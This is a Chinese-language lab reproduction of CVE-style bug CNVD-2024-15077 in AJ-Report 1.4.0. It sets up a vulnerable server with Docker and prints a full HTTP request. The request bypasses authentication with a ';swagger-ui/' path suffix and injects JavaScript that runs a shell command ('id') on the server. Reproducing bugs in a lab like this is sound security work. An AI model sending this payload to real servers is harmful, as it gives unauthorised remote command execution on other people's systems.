# AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）

## 漏洞环境

执行如下命令启动一个AJ-Report 1.4.0服务器：

```plain
docker compose up -d
```

服务启动后，你可以在http://your-ip:9095查看到登录页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803817150-30abbd15-cfdb-40d0-b5aa-ea0a98060aa2.png)

## 漏洞复现

要利用该漏洞，只需要发送如下数据包：

```plain
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

可见，id命令已经执行成功：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803816849-d7d8c6ba-c082-4069-bf18-f97d58f966c3.png)

